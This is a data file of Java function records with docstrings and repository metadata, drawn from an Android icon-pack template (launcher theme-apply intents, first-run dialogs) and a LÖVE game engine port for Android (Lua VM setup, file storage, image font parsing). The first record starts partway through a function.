\"THEME_PACKAGE\";\n\n\t\t\t@SuppressWarnings(\"unused\")\n\t\t\tMainFragment gridContentT = null;\n\n\t\t\tswitch (position) {\n\t\t\tcase ApplyLauncherAdapter.APEX:\n\t\t\t\tIntent apex = new Intent(APEX_ACTION_SET_THEME);\n\t\t\t\tapex.putExtra(APEX_EXTRA_PACKAGE_NAME, getActivity().getPackageName());\n\t\t\t\tapex.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t\t\ttry {\n\t\t\t\t\tstartActivity(apex);\n\n\t\t\t\t\tToast applied = Toast.makeText(getActivity().getBaseContext(), \n\t\t\t\t\t\t\tgetResources().getString (R.string.finish_apply),\n\t\t\t\t\t\t\tToast.LENGTH_LONG);\n\t\t\t\t\tapplied.show();\n\t\t\t\t} catch (ActivityNotFoundException e) {\n\t\t\t\t\tIntent apexMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tapexMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_apex_market)));\n\t\t\t\t\tstartActivity(apexMarket);\n\t\t\t\t\tToast failedApex = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(),\n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.apex_market),\n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\tfailedApex.show();\n\t\t\t\t}\n\n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.NOVA:\n\t\t\t\tIntent nova = new Intent(ACTION_APPLY_ICON_THEME);\n\t\t\t\tnova.setPackage(NOVA_PACKAGE);\n                    nova.putExtra(EXTRA_ICON_THEME_TYPE, \"GO\");\n\t\t\t\tnova.putExtra(EXTRA_ICON_THEME_PACKAGE,\n\t\t\t\t\t\tgetResources().getString (R.string.package_name));\n\t\t\t\ttry {\n\t\t\t\t\tstartActivity(nova);\n\t\t\t\t} catch (ActivityNotFoundException e) {\n\t\t\t\t\tIntent novaMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tnovaMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_nova_market)));\n\t\t\t\t\tstartActivity(novaMarket);\n\t\t\t\t\tToast failedNova = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(),\n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.nova_market),\n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\tfailedNova.show();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.AVIATE:\n\t\t\t\tIntent intent = new Intent(AVIATE_ACTION_SET_THEME);\n\t\t\t\t  intent.putExtra(AVIATE_EXTRA_PACKAGE_NAME,\n\t\t\t\t\t\t\tgetResources().getString (R.string.package_name));\n\t\t\t\t  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t\t\t  try {\n\t\t\t\t    startActivity(intent);\n\t\t\t\t  } catch (ActivityNotFoundException e) {\t\t\t\t\t\t\n\t\t\t\t\t\tIntent adwMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\t\tadwMarket.setData(Uri\n\t\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_aviate_market)));\n\t\t\t\t\t\tstartActivity(adwMarket);\n\t\t\t\t\t\tToast failedADW = Toast\n\t\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(),\n\t\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.aviate_market),\n\t\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\t\tfailedADW.show();\n\t\t\t\t\t} \n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.ADW:\n\t\t\t\tIntent adw = new Intent(\"org.adw.launcher.SET_THEME\");\n\t\t\t\tadw.putExtra(\"org.adw.launcher.theme.NAME\",\n\t\t\t\t\t\tgetResources().getString (R.string.package_name));\n\t\t\t\ttry {\n\t\t\t\t\tstartActivity(adw);\n\t\t\t\t} catch (ActivityNotFoundException e) {\t\t\t\t\t\t\n\t\t\t\t\tIntent adwMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tadwMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_adw_market)));\n\t\t\t\t\tstartActivity(adwMarket);\n\t\t\t\t\tToast failedADW = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(),\n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.adw_market),\n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\tfailedADW.show();\n\t\t\t\t} \n\t\t\t\t((Activity) getActivity()).finish();\n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.ACTION:\n\t\t\t\tIntent al = getActivity().getPackageManager().getLaunchIntentForPackage(\n\t\t\t\t\t\t\"com.actionlauncher.playstore\");\n\t\t\t\tif (al != null) {\n\n\t\t\t\t\tString packageName = getResources().getString (R.string.package_name);\n\t\t\t\t\tal.putExtra(\"apply_icon_pack\", packageName);\n\t\t\t\t\tstartActivity(al);\n\t\t\t\t} else {\n\t\t\t\t\tIntent alMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\talMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_al_market)));\n\t\t\t\t\tstartActivity(alMarket);\n\t\t\t\t\tToast failedAL = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(), \n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.al_market),\n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\tfailedAL.show();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.SMART:\n\t\t\t\tIntent smart = new Intent(\"ginlemon.smartlauncher.setGSLTHEME\");\n\t\t\t\tsmart.putExtra(\"package\", getResources().getString (R.string.package_name));\n\t\t\t\tsmart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t  \t\t\n\t\t  \t\ttry {\n\t\t  \t\t\tstartActivity(smart);\n\t\t   \t\t} catch (ActivityNotFoundException e) {\n\t\t  \t\t\t\t\t  \t\t\t\n\t\t  \t\t\tIntent smartMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tsmartMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_smart_market)));\n\t\t\t\t\tstartActivity(smartMarket);\n\t\t\t\t\t\n\t\t  \t\t\tToast failedSmart = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(), \n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.smart_market), \n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\t\t\tfailedSmart.show();\n\t\t   \t\t}\t\n\t\t  \t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.NEXT:\n\t\t\t\tIntent nextApply = getActivity().getPackageManager().getLaunchIntentForPackage(\n\t\t\t\t\t\t\"com.gtp.nextlauncher\");\n\t\t\t\tif (nextApply != null) {\n\t\t\t\t\tIntent go = new Intent(\"com.gau.go.launcherex.MyThemes.mythemeaction\");\n\t                go.putExtra(\"type\",1);\n\t                go.putExtra(\"pkgname\", getResources().getString (R.string.package_name));\n\t                getActivity().sendBroadcast(go);\n\t\t\t\t\tToast appliedGo = Toast\n\t                .makeText(getActivity().getBaseContext(), getResources().getString\n\t                \t\t(R.string.finish_apply), Toast.LENGTH_LONG);\n\t\t\t\t\tappliedGo.show();\n\t\t\t\t\tstartActivity(nextApply);\n\t\t\t   } else {\n\t\t\t\t\tIntent nextMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tnextMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_next_market)));\n\t\t\t\t\tstartActivity(nextMarket);\n\n\t\t\t\t\tToast failedGo = Toast\n\t\t\t\t\t.makeText(getActivity().getBaseContext(), getResources().getString \n\t\t\t\t\t\t\t(R.string.next_market), Toast.LENGTH_SHORT);\n\t\t\t\t\tfailedGo.show();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase ApplyLauncherAdapter.GO:\n\t\t\t\tIntent goApply = getActivity().getPackageManager().getLaunchIntentForPackage(\n\t\t\t\t\t\t\"com.gau.go.launcherex\");\n\t\t\t\tif (goApply != null) {\n\t\t\t\t\tIntent go = new Intent(\"com.gau.go.launcherex.MyThemes.mythemeaction\");\n\t                go.putExtra(\"type\",1);\n\t                go.putExtra(\"pkgname\", getResources().getString (R.string.package_name));\n\t                getActivity().sendBroadcast(go);\n\t\t\t\t\tToast appliedGo = Toast\n\t                .makeText(getActivity().getBaseContext(), getResources().getString\n\t                \t\t(R.string.finish_apply), Toast.LENGTH_LONG);\n\t\t\t\t\tappliedGo.show();\n\t\t\t\t\tstartActivity(goApply); \n\t\t\t   } else {\n\t\t\t\t\tIntent goMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tgoMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_go_market)));\n\t\t\t\t\tstartActivity(goMarket);\n\n\t\t\t\t\tToast failedGo = Toast\n\t\t\t\t\t.makeText(getActivity().getBaseContext(), getResources().getString \n\t\t\t\t\t\t\t(R.string.go_market), Toast.LENGTH_SHORT);\n\t\t\t\t\tfailedGo.show();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t\t\n\t\t\tcase ApplyLauncherAdapter.HOLO:\n\t\t\t\tIntent holo = new Intent(Intent.ACTION_MAIN);\n\t\t\t\tholo.setComponent(new ComponentName(\"com.mobint.hololauncher\",\n\t\t\t\t\t\t\"com.mobint.hololauncher.SettingsActivity\"));\n\n\t\t\t\ttry{startActivity(holo);\n\n\t\t\t\tToast applied = Toast.makeText(getActivity().getBaseContext(), \n\t\t\t\t\t\tgetResources().getString (R.string.finish_holo_apply),\n\t\t\t\t\t\tToast.LENGTH_LONG);\n\t\t\t\tapplied.show();\n\n\t\t\t\t}catch(ActivityNotFoundException e) {\n\t\t\t\t\tIntent holoMarket = new Intent(Intent.ACTION_VIEW);\n\t\t\t\t\tholoMarket.setData(Uri\n\t\t\t\t\t\t\t.parse(getResources().getString(R.string.launcher_holo_market)));\n\t\t\t\t\tstartActivity(holoMarket);\n\t\t\t\t\tToast failedHolo = Toast\n\t\t\t\t\t\t\t.makeText(\n\t\t\t\t\t\t\t\t\tgetActivity().getBaseContext(),\n\t\t\t\t\t\t\t\t\tgetResources().getString (R.string.holo_market),\n\t\t\t\t\t\t\t\t\tToast.LENGTH_SHORT);\n\t\t\t\t\tfailedHolo.show();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t});\n\n\t//Cancels and returns to main screen of app\n\t  btnCancel = (Button) getView().findViewById(R.id.btnCancel);\n\t  btnCancel.setOnClickListener(new OnClickListener() {\n\t          public void onClick(View v) {\n\t        \t  ((Activity) getActivity()).finish();\n\t          }\t\n      });\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\ApplyLauncherFragment.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "/******************************************************************************\n ** This code checks if MY OSS is installed on first run. If it is installed **\n ** you get a dialog that says you're awesome and the user hits OK to remove **\n ** that dialog. If it is NOT installed, the user is prompted to install it. **\n ** You can remove this section if you're not checking for apps on first run **\n ******************************************************************************/\n", "func_signal": "public void onStart()", "code": "{\n\tsuper.onStart();\n\tboolean installed = Utils.isPackageInstalled(\"app.the1dynasty.oss\", MainActivity.this);\n\t\n\t// Checking if installed and if its the first run\n    if (installed) {\n    \tboolean firstrunOSS = getSharedPreferences(\"PREFERENCE\", MODE_PRIVATE)\n    \t\t\t.getBoolean(\"firstrunAPP\", true);\n\t    if (firstrunOSS){\n\t    \t\n    /* \n     * Installed dialog\n     * Check res/values/strings.xml to change text to whatever you want the Alert to say\n     */\n        AlertDialog.Builder alert = new AlertDialog.Builder(this);\n        alert.setTitle(getResources().getString (R.string.alert_start_title));\n        alert.setMessage(getResources().getString (R.string.alert_start_desc));\n        alert.setIcon(R.drawable.alert_pass);\n        alert.setPositiveButton(getResources().getString (R.string.ok), null).show ();\n        \n\t    // Save the state so this dialog doesn't run again\n\t    getSharedPreferences(\"PREFERENCE\", MODE_PRIVATE)\n\t        .edit()\n\t        .putBoolean(\"firstrunAPP\", false) /* You can change this to another name */\n\t        .commit();\n              }\n    }\n\t\n    /* \n     * Not Installed dialog\n     * Check res/values/strings.xml to change text to whatever you want the Alert to say\n     */\n\telse {\n\t\tboolean nofirstrunOSS = getSharedPreferences(\"PREFERENCE\", MODE_PRIVATE)\n    \t\t\t.getBoolean(\"nofirstrunAPP\", true);\n\t    if (nofirstrunOSS){\n\t\tAlertDialog.Builder builder = new AlertDialog.Builder(this);\n\t\tbuilder.setTitle(getResources().getString (R.string.error_start_title));\n\t\tbuilder.setMessage(getResources().getString (R.string.error_start_desc));\n        builder.setIcon(R.drawable.alert_fail);\n\t\tbuilder.setNeutralButton(getResources().getString (R.string.later), new OnClickListener(){\n\t\t\t@Override\n\t\t\tpublic void onClick(DialogInterface arg0, int arg1) {\n\t\t\t}\n\t\t});\n\t\t\n\t // Change line 326 with the URL to YOUR app\n\t\tbuilder.setPositiveButton(getResources().getString (R.string.get), new OnClickListener(){\n\t\t\t@Override\n\t\t\tpublic void onClick(DialogInterface arg0, int arg1) {\n\t\t\t\tIntent share = new Intent(Intent.ACTION_VIEW).setData(Uri.parse\n\t\t\t\t\t\t(getResources().getString(R.string.app_market)));\n\t    \t\tstartActivity(share);\n\t\t}\n\t\t});\n\t\tbuilder.show();\n\t\t\n\t\t// Save the state so this dialog doesn't run again\n\t    getSharedPreferences(\"PREFERENCE\", MODE_PRIVATE)\n\t        .edit()\n\t        .putBoolean(\"nofirstrunAPP\", false) /* You can change this to another name */\n\t        .commit();\n\t    // TODO Make this random (1/8)\n\t    }\n    }\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\MainActivity.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// Hides the title bar\n", "func_signal": "public void noTitle()", "code": "{\n\trequestWindowFeature(Window.FEATURE_NO_TITLE);\n\tgetWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, \n\t\t\tWindowManager.LayoutParams.FLAG_FULLSCREEN);\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\AboutDev.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "/**\n * General view initialization used common to all constructors of the view.\n */\n", "func_signal": "private void init()", "code": "{\n    // Reset default ImageButton background and padding.\n    setBackgroundColor(0);\n    setPadding(0, 0, 0, 0);\n\n    // Retrieve the drawable resource assigned to the android.R.attr.selectableItemBackground\n    // theme attribute from the current theme.\n    TypedArray a = getContext()\n            .obtainStyledAttributes(new int[]{android.R.attr.selectableItemBackground});\n    mForegroundDrawable = a.getDrawable(0);\n    mForegroundDrawable.setCallback(this);\n    a.recycle();\n}", "path": "IconPack-Template\\src\\view\\TouchHighlightImageButton.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "/************************************************************************\n ******************** This is your Changelog Stuff **********************\n ************************************************************************/\n", "func_signal": "public void checkBuild()", "code": "{\n  int buildNum = prefs.getInt(\"Build Number\", 1);\n  int currentVersion = 0;\n  \n  try {\n    currentVersion = getPackageManager()\n    \t\t.getPackageInfo(getPackageName(), 0).versionCode;\n  }\n  catch (NameNotFoundException e) {\n    e.printStackTrace();\n  }\n    if(currentVersion > buildNum) {\n    \t  getChangelog().show();\n    \t  Editor editor = prefs.edit();\n    \t  editor.putInt(\"Build Number\", currentVersion);\n    \t  editor.commit();\n    \t}\n  }", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\MainActivity.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "//This activity is what displays the icon fragments (the icon categories) see iconfragment for the tabs themselves\n", "func_signal": "@Override\n\t    public void onCreate(Bundle savedInstanceState)", "code": "{\n\n\t        super.onCreate(savedInstanceState);\n\t        setContentView(R.layout.all_icons_layout);\n\n\t        \n\t        tabs = (PagerSlidingTabStrip) findViewById(R.id.tabs);\n\tViewPager pager = (ViewPager) findViewById(R.id.pager);\n\n\tadapter = new IconPagerAdapter(getSupportFragmentManager());\n\n\tpager.setAdapter(adapter);\n\t\n\n\tfinal int pageMargin = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 4, getResources()\n\t\t\t.getDisplayMetrics());\n\tpager.setPageMargin(pageMargin);\n\n\ttabs.setViewPager(pager);\n\n\t        // Set Present tab as default\n\t        pager.setCurrentItem(1);\n\n\t    }", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\AllIcons.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// This will return the Activity to the Main Screen when the app is in a Paused (not used) state\n", "func_signal": "@Override\n  public void onPause()", "code": "{\n\t  super.onPause();\n\t  finish();\n  }", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\activity\\ApplyLauncherMain.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n    \n    /** TODO\n     * Change array\n     */\n    addIcon(resources, packageName, R.array.icon_pack);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentAll.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// This is the background layout that gets inflated behind the list view\n", "func_signal": "public View onCreateView(LayoutInflater inflater, ViewGroup container_launcher,\n\t\tBundle savedInstanceState)", "code": "{\n\tView view = inflater.inflate(R.layout.apply_launcher_behind, null);\n\tgridView = (GridView) view.findViewById(R.id.grid);\n\treturn view;\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\ApplyLauncherFragment.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "////////////////////////////////////////////////\n", "func_signal": "private void loadIcon()", "code": "{\n    mThumbs = new ArrayList<Integer>();\n\n    final Resources resources = getResources();\n    final String packageName = getActivity().getApplication().getPackageName();\n    \n    /** TODO\n     * Change array\n     */\n    addIcon(resources, packageName, R.array.gamesicons);\n\n}", "path": "IconPack-Template\\src\\your\\icons\\name\\here\\fragment\\IconFragmentGames.java", "repo_name": "the1dynasty/IconPack-Template", "stars": 81, "license": "other", "language": "java", "size": 9129}
{"docstring": "// / android style popup notification\n", "func_signal": "public void toast(final String string)", "code": "{\n\tassert (attachedToThisActivity != null);\n\n\tattachedToThisActivity.runOnUiThread(new Runnable() {\n\t\tpublic void run() {\n\t\t\tContext context = attachedToThisActivity\n\t\t\t\t\t.getApplicationContext();\n\t\t\tint duration = Toast.LENGTH_SHORT;\n\n\t\t\tToast toast = Toast.makeText(context, string, duration);\n\t\t\ttoast.show();\n\t\t}\n\t});\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / call user defined love.load() in main.lua\n", "func_signal": "public void load()", "code": "{\n\tassert (bInitDone);\n\ttry {\n\t\tLoveLog(\"calling love.load...\");\n\t\t_G.get(\"love\").get(\"load\").call();\n\t} catch (LuaError e) {\n\t\thandleLuaError(e);\n\t}\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// view.setKeepScreenOn needs to be done in mainthread, or exception will be thrown : vm error: android.view.ViewRoot$CalledFromWrongThreadException: Only the original thread that created a view hierarchy can touch its views.\n", "func_signal": "public void setKeepScreenOn(boolean bState)", "code": "{ \n\tbKeepScreenOn_UpdateNeeded = true;\n\tbKeepScreenOn = bState;\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / list/enumerate directory childs\n// / used for love.filesystem.enumerate\n", "func_signal": "public String[] getChildren(String dirpath) throws FileNotFoundException", "code": "{\n\tif (isZip())\n\t\treturn mLoveZip.getChildren(dirpath);\n\tFile f = new File(convertFilePath(dirpath));\n\treturn f.list();\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveStorage.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / warn first time, then ignore\n", "func_signal": "public void NotImplemented(String s)", "code": "{\n\tif (mSetKnownNotImplemented.contains(s))\n\t\treturn;\n\tmSetKnownNotImplemented.add(s);\n\tLoveLogE(TAG, \"WARNING:NotImplemented: \" + s);\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / called when activity.onCreate has finished setting up the window\n", "func_signal": "public void notifyOnCreateDone()", "code": "{\n\tLoveLog(\"notifyOnCreateDone\");\n\tcheckAllInitOk();\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// imageFont\n", "func_signal": "private void init (LuanGraphics g, LuanObjImage img, String glyphs)", "code": "{\n\tthis.g = g;\n\tthis.img = img;\n\t\n\t// debug log\n\t//~ PrintWriter\tpLog = null;\n\t//~ File fTempDir = g.vm.getStorage().getWritableSdCardDir(); // TODO: remove, DEBUG only\n\t//~ File fLog = null;\n\t//~ try {\n\t\t//~ fLog = File.createTempFile(\"fontlog\",\".txt\",fTempDir); // TODO: remove, DEBUG only\n\t\t//~ pLog = new PrintWriter(fLog);\n\t\t//~ pLog.println(\"FontConstr: start \"+fLog.getPath());\n\t//~ } catch (IOException e) {\n\t//~ }\n\t\n\t\n\t/*\n\tThe imagefont file is an image file in a format that L\ufffdve can load. It can contain transparent pixels, so a PNG file is preferable, and it also needs to contain spacer color that will separate the different font glyphs.\n\tThe upper left pixel of the image file is always taken to be the spacer color. All columns that have this color as their uppermost pixel are interpreted as separators of font glyphs. The areas between these separators are interpreted as the actual font glyphs.\n\tThe width of the separator areas affect the spacing of the font glyphs. It is possible to have more areas in the image than are required for the font in the love.graphics.newImageFont() call. The extra areas are ignored. \n\t*/\n\tint col = img.getColAtPos(0,0);\n\tint x = 0;\n\tint imgw = (int)img.mWidth;\n\tfont_h = (int)img.mHeight;\n\tw_space = 0f;\n\twhile (x < imgw && img.getColAtPos(x,0) == col) ++x; // skip first separator column\n\t\t\n\t//~ if (pLog != null) pLog.println(\"FontConstr: img=\"+img.getDebugSource()+\" col=\"+col+\" w=\"+imgw+\" h=\"+font_h+\" x0=\"+x); // TODO: remove, DEBUG only\n\t//~ LoveVM.LoveLog(TAG,\"FontConstr: img=\"+img.getDebugSource()+\" col=\"+col+\" w=\"+imgw+\" h=\"+font_h+\" x0=\"+x); // TODO: remove, DEBUG only\n\t\n\tfor (int i=0;i<glyphs.length();++i) {\n\t\tchar c = glyphs.charAt(i);\n\t\t\n\t\t// calc the size of the glyph\n\t\tint w = 1;\n\t\twhile (x+w < imgw && img.getColAtPos(x+w,0) != col) ++w;\n\t\t\t\n\t\t// calc the size of the separator\n\t\tint spacing = 0;\n\t\twhile (x+w+spacing < imgw && img.getColAtPos(x+w+spacing,0) == col) ++spacing;\n\t\t\n\t\t// register glyph\n\t\t//~ LoveVM.LoveLog(TAG,\"glyph:\"+c+\":x=\"+x+\",w=\"+w+\",spacing=\"+spacing);\n\t\tmGlyphInfos.put(c,new GlyphInfo(w,w+spacing,(float)x/(float)imgw,(float)(x+w)/(float)imgw));\n\t\t\n\t\t//~ if (pLog != null) pLog.println(\"glyph=\"+c+\" x=\"+x+\" w=\"+w+\" spacing=\"+spacing); // TODO: remove, DEBUG only\n\t\t//~ LoveVM.LoveLog(TAG,\"glyph=\"+c+\" x=\"+x+\" w=\"+w+\" spacing=\"+spacing); // TODO: remove, DEBUG only\n\t\t\n\t\tif (w_space == 0f) w_space = w;\n\t\tx += w+spacing;\n\t}\n\t\n\tGlyphInfo gi = getGlyphInfo(' '); \n\tif (gi != null) w_space = gi.movex;\n\t\t\n\t//~ if (pLog != null) pLog.flush();\n\t//~ if (pLog != null) pLog.close();\t\t\n}", "path": "src\\net\\schattenkind\\androidLove\\luan\\obj\\LuanObjFont.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "/// only called during update/draw !\n/// thread-safe-mutex-list-and-exec-in-update/draw\n", "func_signal": "public void ExecEvents ()", "code": "{\n\ttry {\n\t\twhile (true) {\n\t\t\tcLoveEvent e = PopEvent();\n\t\t\tif (e == null) break; else e.Execute(this);\n\t\t}\n\t} catch (Exception e) {  // java.io.IOException?\n\t\t// weird but seems to happen from calling a synchronized, even if it never returns an event\n\t}\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// ***** ***** ***** ***** ***** constructor\n", "func_signal": "public LoveVM(LoveStorage storage)", "code": "{\n\tthis.attachedToThisActivity = null;\n\tthis.storage = storage;\n\tthis.config = new LoveConfig();\n\tmyEventList = new LinkedList<cLoveEvent>();\n\n\tnotifyOnGfxReinitList = new LinkedList<WeakReference<GfxReinitListener>>();\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / check if all ainit conditions are satisified and if yes run init if it\n// hasn't been run already\n", "func_signal": "public void checkAllInitOk()", "code": "{\n\tif (!bInitDone && gl != null && bInitCondition_ScreenSize\n\t\t\t&& bInitCondition_NotifyGL && !bInitCondition_initAlreadyCalled) {\n\t\tbInitCondition_initAlreadyCalled = true;\n\t\tinit();\n\t}\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / called when gl context is created or updated\n", "func_signal": "public void notifyGL(GL10 gl)", "code": "{\n\tif (!bInitCondition_NotifyGL)\n\t\tLoveLog(\"notifyGL\");\n\tthis.gl = gl;\n\tbInitCondition_NotifyGL = true;\n\tcheckAllInitOk();\n\tcheckGfxReinit();\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// / avoid if possible, see forceGetFilePathFromLovePath\n", "func_signal": "public File forceGetFileFromLovePath(String sPath) throws IOException", "code": "{\n\treturn isZip() ? mLoveZip.forceExtractToTempFile(sPath)\n\t\t\t: getFileFromSdCard(sPath);\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveStorage.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// ***** ***** ***** ***** ***** lua api\n", "func_signal": "private void setupCoreFunctions()", "code": "{\n\t_G.set(\"print\", new VarArgFunction() {\n\t\t@Override\n\t\tpublic LuaValue invoke(Varargs args) {\n\t\t\targs.narg();\n\n\t\t\tStringBuffer s = new StringBuffer();\n\n\t\t\tfor (int i = 1; i <= args.narg(); ++i) {\n\t\t\t\tif (i > 1) {\n\t\t\t\t\ts.append(\", \");\n\t\t\t\t}\n\t\t\t\ts.append(args.arg(i).toString());\n\t\t\t}\n\n\t\t\tLoveLog(TAG, s.toString());\n\n\t\t\treturn LuaValue.NONE;\n\t\t}\n\t});\n\n\t_G.set(\"toast\", new VarArgFunction() {\n\t\t@Override\n\t\tpublic LuaValue invoke(Varargs args) {\n\t\t\targs.narg();\n\n\t\t\tStringBuffer s = new StringBuffer();\n\n\t\t\tfor (int i = 1; i <= args.narg(); ++i) {\n\t\t\t\tif (i > 1) {\n\t\t\t\t\ts.append(\", \");\n\t\t\t\t}\n\t\t\t\ts.append(args.arg(i).toString());\n\t\t\t}\n\n\t\t\ttoast(s.toString());\n\n\t\t\treturn LuaValue.NONE;\n\t\t}\n\t});\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveVM.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
{"docstring": "// ***** ***** ***** ***** ***** constructor\n", "func_signal": "public LoveStorage(int iLoveZipResID) throws IOException", "code": "{\n\tactivity = null;\n\t\n\tloveAppRootOnSdCard = sRootPathForZipAndResource;\n\tmLoveZip = new LoveZip(this, getResourceInputStream(iLoveZipResID));\n}", "path": "src\\net\\schattenkind\\androidLove\\LoveStorage.java", "repo_name": "hagish/love-android", "stars": 70, "license": "zlib", "language": "java", "size": 4817}
